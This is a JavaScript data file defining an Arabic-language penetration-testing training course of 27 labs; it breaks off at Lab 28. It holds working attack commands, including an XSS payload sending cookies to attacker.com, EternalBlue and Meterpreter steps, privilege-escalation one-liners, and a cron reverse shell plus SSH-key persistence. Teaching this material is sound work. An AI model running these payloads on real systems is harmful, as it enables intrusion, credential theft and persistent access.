// Interactive Labs System
export const LABS = {
  linux_basics: {
    title: "🔬 Lab 1: Linux File Operations",
    difficulty: "مبتدئ",
    duration: "15 دقيقة",
    xp: 50,
    tasks: [
      { id: 1, title: "إنشاء مجلد وملف", description: "أنشئ مجلد بـ اسم 'my_project' وملف بـ اسم 'script.sh'", commands: ["mkdir my_project", "touch my_project/script.sh"], hint: "استخدم mkdir و touch", validation: (output) => output.includes("my_project") && output.includes("script.sh") },
      { id: 2, title: "تغيير الصلاحيات", description: "غيّر صلاحيات script.sh لـ 755", commands: ["chmod 755 my_project/script.sh"], hint: "chmod 755 = rwxr-xr-x", validation: (output) => output.includes("755") },
      { id: 3, title: "البحث عن الملفات", description: "ابحث عن كل الملفات بصيغة .sh", commands: ["find . -name '*.sh'"], hint: "استخدم find مع -name", validation: (output) => output.includes("script.sh") }
    ]
  },
  bash_scripting: {
    title: "🔬 Lab 2: Bash Port Scanner",
    difficulty: "متوسط",
    duration: "30 دقيقة",
    xp: 100,
    tasks: [
      { id: 1, title: "كتابة حلقة for", description: "اكتب حلقة تطبع الأرقام من 1 لـ 10", code: "for i in {1..10}; do\n  echo $i\ndone", hint: "for i in {1..10}; do ... done", validation: (output) => output.match(/\d+/).length >= 10 },
      { id: 2, title: "Ping Sweep", description: "اكتب script يفحص الأجهزة الحية على الشبكة", code: "for i in {1..254}; do\n  ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo \"192.168.1.$i ALIVE\"\ndone", hint: "استخدم ping مع timeout", validation: (output) => output.includes("ALIVE") },
      { id: 3, title: "Port Scanner", description: "اكتب script يفحص المنافذ المفتوحة", code: "for port in 22 80 443 3306 8080; do\n  (echo >/dev/tcp/192.168.1.1/$port) 2>/dev/null && echo \"Port $port OPEN\"\ndone", hint: "/dev/tcp/host/port — طريقة Bash", validation: (output) => output.includes("OPEN") }
    ]
  },
  python_hacking: {
    title: "🔬 Lab 3: Python Port Scanner",
    difficulty: "متوسط",
    duration: "25 دقيقة",
    xp: 100,
    tasks: [
      { id: 1, title: "Socket Connection", description: "كتابة socket بسيط للاتصال بـ port", code: "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nresult = s.connect_ex(('192.168.1.1', 22))\nif result == 0:\n    print('Port 22 OPEN')\ns.close()", hint: "استخدم socket.socket و connect_ex", validation: (output) => output.includes("OPEN") },
      { id: 2, title: "Port Range Scanner", description: "فحص range من المنافذ", code: "import socket\nhost = '192.168.1.1'\nfor port in range(1, 1025):\n    s = socket.socket()\n    result = s.connect_ex((host, port))\n    if result == 0:\n        print(f'Port {port} OPEN')\n    s.close()", hint: "استخدم loop مع range", validation: (output) => output.includes("OPEN") },
      { id: 3, title: "Threaded Scanner", description: "فحص مع threads للسرعة", code: "import socket, threading\ndef scan(host, port):\n    s = socket.socket()\n    result = s.connect_ex((host, port))\n    if result == 0:\n        print(f'Port {port} OPEN')\n    s.close()\n\nhost = '192.168.1.1'\nfor port in range(1, 1025):\n    t = threading.Thread(target=scan, args=(host, port))\n    t.start()", hint: "استخدم threading.Thread", validation: (output) => output.includes("OPEN") }
    ]
  },
  web_security: {
    title: "🔬 Lab 4: SQL Injection Testing",
    difficulty: "متقدم",
    duration: "40 دقيقة",
    xp: 150,
    tasks: [
      { id: 1, title: "SQL Injection Detection", description: "اكتشف SQL Injection في form", code: "import requests\nurl = 'http://target.com/login.php'\npayload = \"' OR '1'='1\"\ndata = {'username': payload, 'password': 'any'}\nr = requests.post(url, data=data)\nif 'Welcome' in r.text or 'Dashboard' in r.text:\n    print('[+] SQL Injection Found!')\nelse:\n    print('[-] Not vulnerable')", hint: "ابحث عن كلمات مثل Welcome أو Dashboard", validation: (output) => output.includes("SQL Injection") || output.includes("Found") },
      { id: 2, title: "Database Enumeration", description: "استخرج أسماء الجداول", code: "import requests\nurl = 'http://target.com/search.php'\npayload = \"' UNION SELECT table_name FROM information_schema.tables--\"\nr = requests.get(url, params={'q': payload})\nif 'users' in r.text or 'admin' in r.text:\n    print('[+] Database enumerated')", hint: "استخدم UNION SELECT", validation: (output) => output.includes("enumerated") },
      { id: 3, title: "XSS Testing", description: "اختبر XSS vulnerability", code: "import requests\nurl = 'http://target.com/comment.php'\nxss_payload = '<img src=x onerror=alert(1)>'\ndata = {'comment': xss_payload}\nr = requests.post(url, data=data)\nif xss_payload in r.text:\n    print('[+] XSS Vulnerability Found!')\nelse:\n    print('[-] Input is sanitized')", hint: "ابحث عن payload في الـ response", validation: (output) => output.includes("XSS") }
    ]
  },
  network_recon: {
    title: "🔬 Lab 5: Network Reconnaissance",
    difficulty: "مبتدئ",
    duration: "20 دقيقة",
    xp: 75,
    tasks: [
      { id: 1, title: "Nmap Basic Scan", description: "افحص الأجهزة والمنافذ المفتوحة على الشبكة", code: "# فحص بسيط\nnmap 192.168.1.1\n\n# فحص range\nnmap 192.168.1.1-254\n\n# فحص مع كشف الخدمات\nnmap -sV 192.168.1.1", hint: "nmap -sV يكشف إصدار الخدمة", validation: (output) => output.includes("open") || output.includes("nmap") },
      { id: 2, title: "OS Detection", description: "اكتشف نظام التشغيل على الهدف", code: "# كشف نظام التشغيل\nnmap -O 192.168.1.1\n\n# فحص شامل\nnmap -A 192.168.1.1", hint: "-O للـ OS detection، -A للفحص الكامل", validation: (output) => output.includes("OS") || output.includes("Linux") || output.includes("Windows") },
      { id: 3, title: "Service Enumeration", description: "احصل على معلومات تفصيلية عن الخدمات", code: "# فحص تفصيلي\nnmap -sV -sC -p- 192.168.1.1\n\n# حفظ النتائج\nnmap -oN results.txt 192.168.1.1", hint: "-p- يفحص كل المنافذ (1-65535)", validation: (output) => output.includes("service") || output.includes("version") }
    ]
  },
  password_attacks: {
    title: "🔬 Lab 6: Password Attacks",
    difficulty: "متوسط",
    duration: "35 دقيقة",
    xp: 120,
    tasks: [
      { id: 1, title: "Wordlist Generation", description: "إنشاء قائمة كلمات مرور مخصصة", code: "# بـ crunch\ncrunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt\n\n# بـ cupp (معلومات شخصية)\npython3 cupp.py -i", hint: "crunch min max characters — لإنشاء كل التوليفات", validation: (output) => output.includes("wordlist") || output.includes("passwords") },
      { id: 2, title: "Hydra SSH Brute Force", description: "كسر كلمة مرور SSH", code: "# Hydra على SSH\nhydra -l admin -P wordlist.txt ssh://192.168.1.1\n\n# أو مع userlist\nhydra -L users.txt -P passwords.txt ssh://192.168.1.1 -t 4", hint: "-l للـ username الواحد، -L للقائمة", validation: (output) => output.includes("[22]") || output.includes("login") },
      { id: 3, title: "Hash Cracking", description: "كسر الـ hash بـ John the Ripper", code: "# كسر MD5 hash\necho '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt\njohn --format=raw-md5 hash.txt\n\n# بـ wordlist\njohn --wordlist=rockyou.txt hash.txt", hint: "rockyou.txt في /usr/share/wordlists/ على Kali", validation: (output) => output.includes("password") || output.includes("hash") }
    ]
  },
  osint_lab: {
    title: "🔬 Lab 7: OSINT Investigation",
    difficulty: "مبتدئ",
    duration: "25 دقيقة",
    xp: 75,
    tasks: [
      { id: 1, title: "Google Dorking", description: "ابحث عن معلومات حساسة بـ Google Dorks", code: "# ملفات حساسة\nsite:target.com filetype:pdf\nsite:target.com filetype:xlsx\n\n# صفحات Login\nsite:target.com inurl:admin\nsite:target.com inurl:login\n\n# معلومات مخفية\nsite:target.com intitle:\"index of\"", hint: "site: و filetype: و inurl: — أهم الـ operators", validation: (output) => output.includes("site:") || output.includes("filetype:") },
      { id: 2, title: "Email Harvesting", description: "اجمع عناوين الإيميل المرتبطة بنطاق معين", code: "# بـ theHarvester\ntheHarvester -d target.com -l 500 -b google\ntheHarvester -d target.com -l 500 -b linkedin\n\n# أو Hunter.io\n# https://hunter.io/search/target.com", hint: "theHarvester يجمع emails, subdomains, IPs", validation: (output) => output.includes("@") || output.includes("email") },
      { id: 3, title: "Subdomain Enumeration", description: "اكتشف النطاقات الفرعية", code: "# بـ Sublist3r\npython3 sublist3r.py -d target.com\n\n# بـ amass\namass enum -d target.com\n\n# بـ DNS brute force\ndnsenum target.com", hint: "الـ subdomains ممكن تكون أقل حماية من الموقع الرئيسي", validation: (output) => output.includes("subdomain") || output.includes("Found") }
    ]
  },
  web_recon: {
    title: "🔬 Lab 8: Web Application Recon",
    difficulty: "متوسط",
    duration: "30 دقيقة",
    xp: 100,
    tasks: [
      { id: 1, title: "Directory Bruteforce", description: "اكتشف المجلدات والملفات المخفية", code: "# بـ Gobuster\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\n\n# بـ Dirb\ndirb http://target.com\n\n# بـ Feroxbuster (أسرع)\nferoxbuster -u http://target.com", hint: "common.txt في /usr/share/wordlists/dirb/ على Kali", validation: (output) => output.includes("200") || output.includes("Found") },
      { id: 2, title: "Technology Detection", description: "اكتشف التقنيات المستخدمة في الموقع", code: "# بـ Wappalyzer (extension)\n# أو بـ whatweb\nwhatweb target.com\n\n# بـ Nmap\nnmap -sV --script=http-headers target.com\n\n# Check robots.txt و sitemap.xml\ncurl http://target.com/robots.txt\ncurl http://target.com/sitemap.xml", hint: "robots.txt ممكن يكشف مجلدات حساسة", validation: (output) => output.includes("http") || output.includes("WordPress") },
      { id: 3, title: "Vulnerability Scanning", description: "افحص الموقع عن الثغرات", code: "# بـ Nikto\nnikto -h http://target.com\n\n# بـ OWASP ZAP\nzap-baseline.py -t http://target.com\n\n# بـ Nuclei\nnuclei -u http://target.com", hint: "Nikto سريع للفحص الأولي، Nuclei أدق", validation: (output) => output.includes("vulnerability") || output.includes("VULNERABLE") }
    ]
  }
,
  xss_lab: {
    title: "🔬 Lab 9: XSS Attacks",
    difficulty: "متوسط",
    duration: "30 دقيقة",
    xp: 120,
    tasks: [
      { id: 1, title: "Reflected XSS", description: "اختبر Reflected XSS في search parameter", code: "# Payload بسيط\n<script>alert('XSS')</script>\n\n# في URL:\nhttp://target.com/search?q=<script>alert(1)</script>\n\n# بـ curl\ncurl 'http://target.com/search?q=<script>alert(1)</script>'", hint: "ابحث عن الـ payload في الـ response", validation: (output) => output.includes("XSS") || output.includes("script") },
      { id: 2, title: "Stored XSS", description: "احقن XSS داخل تعليق أو منتدى", code: "# Payload في comment\n<img src=x onerror=alert(document.cookie)>\n\n# Payload لسرقة Cookies\n<script>\ndocument.location='http://attacker.com/steal?c='+document.cookie\n</script>", hint: "Stored XSS أخطر من Reflected لأنه يؤثر على كل الزوار", validation: (output) => output.includes("cookie") || output.includes("XSS") },
      { id: 3, title: "XSS Filter Bypass", description: "تجاوز فلاتر الحماية", code: "# Bypass بدون script tag\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onpageshow=alert(1)>\n\n# Case insensitive\n<SCRIPT>alert(1)</SCRIPT>", hint: "جرب tags مختلفة عن script", validation: (output) => output.includes("bypass") || output.includes("onerror") }
    ]
  },
  privilege_escalation: {
    title: "🔬 Lab 10: Privilege Escalation",
    difficulty: "متقدم",
    duration: "45 دقيقة",
    xp: 200,
    tasks: [
      { id: 1, title: "SUID Binaries", description: "ابحث عن ملفات SUID", code: "find / -perm -4000 2>/dev/null\n/usr/bin/find . -exec /bin/bash -p \\;", hint: "SUID = الملف بيشتغل بصلاحيات المالك", validation: (output) => output.includes("find") || output.includes("bash") },
      { id: 2, title: "Sudo Misconfigurations", description: "استغل إعدادات sudo الخاطئة", code: "sudo -l\nsudo python3 -c 'import os; os.system(\"/bin/bash\")'", hint: "sudo -l يعرض كل الأوامر المسموحة", validation: (output) => output.includes("sudo") || output.includes("root") },
      { id: 3, title: "Cron Jobs", description: "استغل Cron Jobs للوصول لـ root", code: "cat /etc/crontab\necho 'chmod +s /bin/bash' >> /tmp/backup.sh", hint: "ابحث عن scripts تشتغل كـ root", validation: (output) => output.includes("cron") || output.includes("root") }
    ]
  },
  metasploit_lab: {
    title: "🔬 Lab 11: Metasploit Framework",
    difficulty: "متوسط",
    duration: "40 دقيقة",
    xp: 150,
    tasks: [
      { id: 1, title: "Metasploit Basics", description: "تعلم أساسيات Metasploit", code: "msfconsole\nmsf> search eternalblue\nmsf> use exploit/windows/smb/ms17_010_eternalblue\nmsf> set RHOSTS 192.168.1.1\nmsf> run", hint: "search, use, set, run", validation: (output) => output.includes("msf") || output.includes("exploit") },
      { id: 2, title: "Meterpreter Shell", description: "استخدام Meterpreter", code: "meterpreter> sysinfo\nmeterpreter> getuid\nmeterpreter> hashdump\nmeterpreter> shell", hint: "Meterpreter أقوى من shell عادي", validation: (output) => output.includes("meterpreter") },
      { id: 3, title: "Post Exploitation", description: "جمع معلومات بعد الاختراق", code: "msf> use post/linux/gather/enum_system\nmeterpreter> run autoroute -s 192.168.2.0/24", hint: "local_exploit_suggester يقترح privilege escalation", validation: (output) => output.includes("post") }
    ]
  },
  wifi_hacking: {
    title: "🔬 Lab 12: WiFi Security Testing",
    difficulty: "متوسط",
    duration: "35 دقيقة",
    xp: 130,
    tasks: [
      { id: 1, title: "Monitor Mode", description: "تفعيل Monitor Mode وفحص الشبكات", code: "airmon-ng start wlan0\nairodump-ng wlan0mon\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon", hint: "wlan0mon هو الـ interface بعد monitor mode", validation: (output) => output.includes("wlan") || output.includes("airodump") },
      { id: 2, title: "WPA2 Handshake", description: "التقاط WPA2 Handshake", code: "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap", hint: "deauth يجبر الأجهزة على إعادة الاتصال", validation: (output) => output.includes("WPA") || output.includes("aircrack") },
      { id: 3, title: "Evil Twin", description: "إنشاء نقطة وصول مزيفة", code: "hostapd hostapd.conf\ndnsmasq -C dnsmasq.conf", hint: "Evil Twin يستغل ثقة المستخدم", validation: (output) => output.includes("hostapd") }
    ]
  },
  buffer_overflow: {
    title: "🔬 Lab 13: Buffer Overflow Basics",
    difficulty: "متقدم",
    duration: "60 دقيقة",
    xp: 250,
    tasks: [
      { id: 1, title: "Stack والـ Memory", description: "تعلم كيف تعمل الـ Stack", code: "#include <string.h>\nvoid vulnerable(char *input) {\n    char buffer[64];\n    strcpy(buffer, input); // خطر!\n}", hint: "strcpy لا تتحقق من الحجم", validation: (output) => output.includes("buffer") || output.includes("stack") },
      { id: 2, title: "Finding the Offset", description: "إيجاد نقطة الـ overflow", code: "python3 -c 'print(\"A\" * 100)' | ./vulnerable\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200", hint: "pattern_create يساعدك تعرف فين الـ EIP", validation: (output) => output.includes("offset") || output.includes("EIP") },
      { id: 3, title: "Writing Exploit", description: "كتابة exploit بسيط", code: "import struct\noffset = 64\neip = struct.pack('<I', 0xdeadbeef)\npayload = b'A' * offset + eip", hint: "NOP sled يزيد احتمالية نجاح الـ exploit", validation: (output) => output.includes("exploit") || output.includes("payload") }
    ]
  },
  cryptography_lab: {
    title: "🔬 Lab 14: Cryptography & Hashing",
    difficulty: "مبتدئ",
    duration: "25 دقيقة",
    xp: 80,
    tasks: [
      { id: 1, title: "Hashing Basics", description: "أنواع الـ Hashes", code: "echo -n 'password' | md5sum\necho -n 'password' | sha256sum\nimport hashlib\nprint(hashlib.md5(b'password').hexdigest())", hint: "MD5 و SHA1 ضعيفان، استخدم SHA256", validation: (output) => output.includes("md5") || output.includes("sha") },
      { id: 2, title: "Hash Cracking", description: "كسر الـ Hashes", code: "john --format=raw-md5 hash.txt\nhashcat -m 0 hash.txt rockyou.txt", hint: "hashcat -m 0 للـ MD5", validation: (output) => output.includes("john") || output.includes("hashcat") },
      { id: 3, title: "Encryption", description: "تشفير وفك تشفير الملفات", code: "openssl enc -aes-256-cbc -in secret.txt -out secret.enc -k mypassword\nopenssl enc -aes-256-cbc -d -in secret.enc -out decrypted.txt -k mypassword", hint: "AES-256 هو المعيار الأقوى", validation: (output) => output.includes("encrypt") || output.includes("AES") }
    ]
  },
  social_engineering: {
    title: "🔬 Lab 15: Social Engineering",
    difficulty: "مبتدئ",
    duration: "20 دقيقة",
    xp: 70,
    tasks: [
      { id: 1, title: "Phishing Email", description: "فهم رسائل Phishing", code: "Subject: تحذير: تم اختراق حسابك!\n# رابط مزيف\nhttps://paypa1.com/verify", hint: "Urgency و Fear أهم عناصر Social Engineering", validation: (output) => output.includes("phishing") || output.includes("email") },
      { id: 2, title: "SET Toolkit", description: "استخدام SET", code: "setoolkit\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester", hint: "SET موجود في Kali", validation: (output) => output.includes("setoolkit") || output.includes("SET") },
      { id: 3, title: "Pretexting", description: "الهجمات الصوتية", code: "# Pretexting:\n'أنا من قسم IT، محتاج باسوردك'\n# لا تعطِ معلومات حساسة أبداً!", hint: "Pretexting = انتحال هوية موثوقة", validation: (output) => output.includes("pretex") || output.includes("social") }
    ]
  },
  reverse_engineering: {
    title: "🔬 Lab 16: Reverse Engineering",
    difficulty: "متقدم",
    duration: "50 دقيقة",
    xp: 220,
    tasks: [
      { id: 1, title: "Static Analysis", description: "تحليل الملف بدون تشغيله", code: "file malware.exe\nstrings malware.exe | grep -E 'http|password|key'\nobjdump -d malware.exe | head -50", hint: "strings أسرع طريقة للمعلومات الأولية", validation: (output) => output.includes("strings") || output.includes("static") },
      { id: 2, title: "Dynamic Analysis", description: "تحليل البرنامج أثناء التشغيل", code: "strace ./program 2>&1 | head -50\nltrace ./program\ntcpdump -i any -w capture.pcap", hint: "strace يكشف كل system calls", validation: (output) => output.includes("strace") || output.includes("dynamic") },
      { id: 3, title: "GDB Debugging", description: "استخدام GDB", code: "gdb ./program\n(gdb) disassemble main\n(gdb) break main\n(gdb) run", hint: "break + run + next + print — أساسيات الـ debugging", validation: (output) => output.includes("gdb") || output.includes("disassemble") }
    ]
  },
  forensics_lab: {
    title: "🔬 Lab 17: Digital Forensics",
    difficulty: "متوسط",
    duration: "35 دقيقة",
    xp: 130,
    tasks: [
      { id: 1, title: "Disk Imaging", description: "نسخة طبق الأصل من القرص", code: "dd if=/dev/sdb of=/mnt/evidence/disk.img bs=4M status=progress\nmd5sum /dev/sdb > original.md5", hint: "dd بيعمل نسخة bit-by-bit", validation: (output) => output.includes("dd") || output.includes("forensics") },
      { id: 2, title: "Log Analysis", description: "تحليل ملفات اللوق", code: "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head", hint: "uniq -c تحسب تكرار كل IP", validation: (output) => output.includes("log") || output.includes("auth") },
      { id: 3, title: "File Recovery", description: "استرداد الملفات المحذوفة", code: "testdisk disk.img\nphotorec disk.img\nforemost -i disk.img -o /mnt/recovered", hint: "photorec يسترد الملفات حتى بعد format", validation: (output) => output.includes("recover") || output.includes("foremost") }
    ]
  },
  ctf_training: {
    title: "🔬 Lab 18: CTF Training",
    difficulty: "متوسط",
    duration: "40 دقيقة",
    xp: 160,
    tasks: [
      { id: 1, title: "Steganography", description: "إخفاء واستخراج البيانات", code: "steghide embed -cf image.jpg -sf secret.txt -p password\nsteghide extract -sf image.jpg -p password\nbinwalk image.jpg", hint: "binwalk يكشف ملفات مخفية", validation: (output) => output.includes("steg") || output.includes("binwalk") },
      { id: 2, title: "Base Encoding", description: "فك تشفير Encodings الشائعة", code: "echo 'SGVsbG8gSGFja2VyIQ==' | base64 -d\necho '48656c6c6f' | xxd -r -p\necho 'Uryyb Unpxre' | tr 'A-Za-z' 'N-ZA-Mn-za-m'", hint: "CyberChef أداة ممتازة لكل أنواع التشفير", validation: (output) => output.includes("base64") || output.includes("decode") },
      { id: 3, title: "CTF Web Challenges", description: "حل تحديات Web", code: "curl -s http://ctf.target.com | grep -i 'flag'\ncurl http://ctf.target.com/robots.txt\ncurl 'http://ctf.target.com/page?file=../../../../etc/passwd'", hint: "ابدأ دائماً بـ Source Code و robots.txt", validation: (output) => output.includes("flag") || output.includes("curl") }
    ]
  },
  malware_analysis: {
    title: "🔬 Lab 19: Malware Analysis",
    difficulty: "متقدم",
    duration: "45 دقيقة",
    xp: 200,
    tasks: [
      { id: 1, title: "Static Analysis", description: "فحص الـ malware بدون تشغيله", code: "file malware.exe\nstrings malware.exe | grep -iE 'http|cmd|powershell|registry'\nyara rule.yar malware.exe", hint: "strings أسرع طريقة لمعرفة ما يفعله الـ malware", validation: (output) => output.includes("strings") || output.includes("malware") },
      { id: 2, title: "Behavioral Analysis", description: "مراقبة سلوك الـ malware", code: "strace ./malware 2>&1\ntcpdump -i any -w malware_traffic.pcap\ninotifywait -m /tmp -e create,modify,delete", hint: "شغّل الـ malware في VM معزولة فقط!", validation: (output) => output.includes("tcpdump") || output.includes("monitor") },
      { id: 3, title: "YARA Rules", description: "اكتب قواعد YARA", code: "rule DetectMalware {\n    strings:\n        $s1 = \"cmd.exe\" nocase\n        $s2 = \"powershell\" nocase\n    condition:\n        2 of ($s1, $s2)\n}\nyara rule.yar malware.exe", hint: "YARA بتكشف malware بناءً على patterns", validation: (output) => output.includes("yara") || output.includes("rule") }
    ]
  },
  api_security: {
    title: "🔬 Lab 20: API Security Testing",
    difficulty: "متوسط",
    duration: "35 دقيقة",
    xp: 140,
    tasks: [
      { id: 1, title: "API Reconnaissance", description: "اكتشف الـ API endpoints", code: "curl http://target.com/api/docs\ncurl http://target.com/swagger.json\ngobuster dir -u http://target.com/api -w common.txt", hint: "ابدأ بـ /api/docs أو /swagger", validation: (output) => output.includes("api") || output.includes("endpoint") },
      { id: 2, title: "JWT Attacks", description: "اختبر ثغرات الـ JWT", code: "echo 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx' | base64 -d\nhashcat -a 0 -m 16500 jwt.txt rockyou.txt", hint: "JWT بدون توقيع ثغرة خطيرة جداً", validation: (output) => output.includes("JWT") || output.includes("token") },
      { id: 3, title: "IDOR in APIs", description: "ابحث عن ثغرات IDOR", code: "curl http://target.com/api/users/1/profile\ncurl http://target.com/api/users/2/profile", hint: "IDOR من أكثر الثغرات شيوعاً في APIs", validation: (output) => output.includes("IDOR") || output.includes("user") }
    ]
  },
  cloud_security: {
    title: "🔬 Lab 21: Cloud Security (AWS)",
    difficulty: "متقدم",
    duration: "40 دقيقة",
    xp: 180,
    tasks: [
      { id: 1, title: "AWS Misconfiguration", description: "اكتشف إعدادات AWS الخاطئة", code: "aws s3 ls s3://target-bucket --no-sign-request\ncurl http://169.254.169.254/latest/meta-data/", hint: "169.254.169.254 هو الـ metadata endpoint", validation: (output) => output.includes("AWS") || output.includes("S3") },
      { id: 2, title: "IAM Privilege Escalation", description: "استغل صلاحيات IAM الخاطئة", code: "aws sts get-caller-identity\naws iam list-attached-user-policies --user-name hacker", hint: "Pacu مثل Metasploit بس لـ AWS", validation: (output) => output.includes("IAM") || output.includes("aws") },
      { id: 3, title: "Container Security", description: "اختبر أمان Docker", code: "docker inspect target_image | grep -i 'env\\|password'\ntrivy image target_image", hint: "Privileged containers خطيرة جداً", validation: (output) => output.includes("docker") || output.includes("container") }
    ]
  },
  active_directory: {
    title: "🔬 Lab 22: Active Directory Attacks",
    difficulty: "متقدم",
    duration: "50 دقيقة",
    xp: 230,
    tasks: [
      { id: 1, title: "AD Enumeration", description: "جمع معلومات عن الـ AD", code: "enum4linux -a 192.168.1.1\nldapsearch -x -h 192.168.1.1 -b 'DC=target,DC=com'\npython3 bloodhound.py -d target.com -u user -p password", hint: "BloodHound يرسم خريطة مسارات الهجوم", validation: (output) => output.includes("AD") || output.includes("ldap") },
      { id: 2, title: "Kerberoasting", description: "سرقة Kerberos tickets", code: "python3 GetUserSPNs.py target.com/user:password -dc-ip 192.168.1.1 -request\nhashcat -m 13100 hashes.txt rockyou.txt", hint: "Service accounts بدون preauth = هدف سهل", validation: (output) => output.includes("kerberos") || output.includes("ticket") },
      { id: 3, title: "Pass the Hash", description: "استخدام الـ NTLM hash", code: "mimikatz # sekurlsa::logonpasswords\npython3 psexec.py administrator@192.168.1.1 -hashes :NTLM_HASH", hint: "Pass the Hash يعمل بدون كسر الـ hash!", validation: (output) => output.includes("hash") || output.includes("mimikatz") }
    ]
  },
  report_writing: {
    title: "🔬 Lab 23: Penetration Test Reporting",
    difficulty: "مبتدئ",
    duration: "30 دقيقة",
    xp: 90,
    tasks: [
      { id: 1, title: "هيكل التقرير", description: "كتابة تقرير احترافي", code: "# 1. Executive Summary\n# 2. Technical Summary\n# 3. Findings\n# 4. Recommendations\n# 5. Appendix", hint: "Executive Summary هو أهم جزء", validation: (output) => output.includes("report") || output.includes("executive") },
      { id: 2, title: "CVSS Scoring", description: "احسب درجة خطورة الثغرات", code: "# CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\n# 9.0-10.0 = Critical\n# 7.0-8.9 = High", hint: "CVSS 9.0+ = Critical", validation: (output) => output.includes("CVSS") || output.includes("score") },
      { id: 3, title: "Proof of Concept", description: "كتابة PoC احترافي", code: "# Title: SQL Injection in login.php\n# Severity: Critical (CVSS 9.8)\n# Steps to Reproduce:\n# 1. Go to login page\n# 2. Enter: ' OR '1'='1", hint: "PoC لازم يكون قابل للتكرار", validation: (output) => output.includes("PoC") || output.includes("reproduce") }
    ]
  },
  mobile_security: {
    title: "🔬 Lab 24: Mobile App Security",
    difficulty: "متوسط",
    duration: "40 دقيقة",
    xp: 160,
    tasks: [
      { id: 1, title: "APK Analysis", description: "فحص تطبيق Android", code: "apktool d app.apk -o app_decoded/\ncat app_decoded/AndroidManifest.xml | grep -i 'permission'\njadx -d output/ app.apk", hint: "AndroidManifest.xml يكشف الصلاحيات", validation: (output) => output.includes("APK") || output.includes("android") },
      { id: 2, title: "Frida Dynamic Analysis", description: "تحليل التطبيق أثناء التشغيل", code: "frida-ps -U\nfrida -U -n 'com.target.app' -e \"\nJava.perform(function() {\n  var Main = Java.use('com.target.MainActivity');\n  Main.checkPassword.implementation = function(p) {\n    return true;\n  };\n});\"", hint: "Frida بتقدر تعدّل سلوك التطبيق runtime", validation: (output) => output.includes("frida") || output.includes("hook") },
      { id: 3, title: "SSL Pinning Bypass", description: "تجاوز SSL Pinning", code: "objection -g com.target.app explore\n> android sslpinning disable\napk-mitm app.apk", hint: "objection أسهل طريقة لـ bypass SSL pinning", validation: (output) => output.includes("SSL") || output.includes("pinning") }
    ]
  },
  iot_security: {
    title: "🔬 Lab 25: IoT Security Testing",
    difficulty: "متوسط",
    duration: "35 دقيقة",
    xp: 150,
    tasks: [
      { id: 1, title: "IoT Discovery", description: "اكتشف أجهزة IoT", code: "nmap -sV -p 23,80,443,554,8080 192.168.1.0/24\nshodan search 'port:23 default password'\narp-scan --localnet", hint: "Shodan محرك بحث للأجهزة المتصلة بالإنترنت", validation: (output) => output.includes("IoT") || output.includes("shodan") },
      { id: 2, title: "Firmware Analysis", description: "استخراج وتحليل Firmware", code: "binwalk firmware.bin\nbinwalk -e firmware.bin\ngrep -r 'password' . --include='*.conf'", hint: "binwalk يستخرج filesystems من الـ firmware", validation: (output) => output.includes("firmware") || output.includes("binwalk") },
      { id: 3, title: "MQTT Protocol", description: "اختبر أمان MQTT", code: "mosquitto_sub -h 192.168.1.1 -t '#' -v\nmosquitto_pub -h 192.168.1.1 -t 'home/door/lock' -m 'UNLOCK'", hint: "MQTT بدون authentication = كل الأجهزة مكشوفة", validation: (output) => output.includes("MQTT") || output.includes("mosquitto") }
    ]
  },
  red_team: {
    title: "🔬 Lab 26: Red Team Operations",
    difficulty: "متقدم",
    duration: "60 دقيقة",
    xp: 280,
    tasks: [
      { id: 1, title: "C2 Framework", description: "إعداد Command & Control server", code: "msfconsole\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_https\nset LHOST attacker.com\nrun", hint: "C2 يخلي التواصل يبدو كـ traffic عادي", validation: (output) => output.includes("C2") || output.includes("payload") },
      { id: 2, title: "Lateral Movement", description: "التحرك داخل الشبكة", code: "psexec.py admin@192.168.1.2 -hashes :NTLM\nwmiexec.py admin:password@192.168.1.2 'whoami'\nssh -L 3306:192.168.2.1:3306 user@jump_host", hint: "Pivoting بيخليك تصل لشبكات مش متصل بيها", validation: (output) => output.includes("lateral") || output.includes("pivot") },
      { id: 3, title: "Persistence", description: "تثبيت وجودك وتجنب الكشف", code: "echo '* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1' | crontab -\necho 'SSH_PUBLIC_KEY' >> ~/.ssh/authorized_keys", hint: "Persistence بيضمن وصولك حتى لو restart", validation: (output) => output.includes("persist") || output.includes("cron") }
    ]
  },
  threat_hunting: {
    title: "🔬 Lab 27: Threat Hunting",
    difficulty: "متقدم",
    duration: "45 دقيقة",
    xp: 190,
    tasks: [
      { id: 1, title: "SIEM Analysis", description: "تحليل اللوقات لاكتشاف التهديدات", code: "# Splunk SPL\nindex=auth sourcetype=linux_secure 'Failed password'\n| stats count by src_ip\n| where count > 10", hint: "Brute Force = نفس IP مع failures كتير", validation: (output) => output.includes("SIEM") || output.includes("splunk") },
      { id: 2, title: "IOC Detection", description: "كشف مؤشرات الاختراق", code: "netstat -an | grep ESTABLISHED\nps aux | grep -iE 'nc|netcat|python -c'\nyara malware_rules.yar /proc/*/exe 2>/dev/null", hint: "IOC تشمل IPs وDomains وHashes مشبوهة", validation: (output) => output.includes("IOC") || output.includes("indicator") },
      { id: 3, title: "Incident Response", description: "الاستجابة لحادثة اختراق", code: "# 1. Identify\nwho; last; netstat -an\n# 2. Contain\niptables -I INPUT -s attacker_ip -j DROP\n# 3. Eradicate\ncrontab -r", hint: "الخطوة الأولى في IR هي التوثيق", validation: (output) => output.includes("incident") || output.includes("contain") }
    ]
  },
  web_advanced: {
    title: "🔬 Lab 28: Advanced Web Attacks",
    difficulty: "متقدم",
